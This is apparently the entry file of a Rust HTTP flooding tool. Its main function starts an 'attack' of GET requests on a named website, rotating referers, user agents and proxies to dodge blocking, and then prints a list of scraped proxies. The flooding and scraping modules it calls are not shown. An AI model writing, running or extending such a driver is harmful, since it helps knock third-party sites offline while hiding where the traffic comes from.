mod https;
mod scrapper;

fn main() {
    https::start_attack(https::Config {
        url: String::from("https://deltastealer.xyz/"),
        method: String::from("GET"),
        random_referers: true,
        random_user_agents: true,
        proxy: true,
    });

    for proxy in scrapper::get_proxies() {
        println!("{}:{}", proxy.ip, proxy.port);
    }
}